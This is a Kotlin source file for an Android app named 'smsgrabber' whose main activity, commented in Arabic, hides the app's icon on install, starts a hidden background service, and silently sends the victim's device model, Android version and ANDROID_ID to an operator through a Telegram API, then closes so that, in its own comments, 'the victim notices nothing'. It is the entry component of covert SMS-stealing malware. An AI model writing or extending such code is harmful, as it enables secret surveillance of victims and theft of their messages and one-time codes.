package com.smsgrabber

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle

/**
 * نشاط شفاف - يشتغل مرة واحدة فقط وقت التنصيب
 * يخفي التطبيق ويشغل الخدمة ثم ينهي نفسه فوراً
 */
class MainActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // 1. إخفاء الأيقونة فوراً (حتى لو ما في LAUNCHER أصلاً)
        hideAppIcon()

        // 2. تشغيل خدمة الخلفية
        startBackgroundService()

        // 3. إرسال إشعار أولي للتيليجرام بأن الجهاز تم ربطه
        sendDeviceInfo()

        // 4. إغلاق النشاط فوراً - الضحية ما بيلاحظ شي
        finish()
    }

    private fun hideAppIcon() {
        try {
            val componentName = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            // فشل الإخفاء - نكمل
        }
    }

    private fun startBackgroundService() {
        val serviceIntent = Intent(this, HideService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }

    private fun sendDeviceInfo() {
        Thread {
            try {
                val deviceInfo = buildString {
                    appendLine("📱 *جهاز جديد مرتبط*")
                    appendLine("🔹 الموديل: ${Build.MODEL}")
                    appendLine("🔹 الشركة: ${Build.MANUFACTURER}")
                    appendLine("🔹 إصدار الأندرويد: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
                    appendLine("🔹 المنتج: ${Build.PRODUCT}")
                    appendLine("🔹 المعرف: ${android.provider.Settings.Secure.getString(
                        contentResolver,
                        android.provider.Settings.Secure.ANDROID_ID
                    )}")
                    appendLine("🔹 الوقت: ${System.currentTimeMillis()}")
                    appendLine("")
                    appendLine("✅ الجهاز جاهز لاستقبال الرسائل")
                }
                TelegramApi.sendMessage(deviceInfo)
            } catch (e: Exception) {
                // silently fail
            }
        }.start()
    }
}
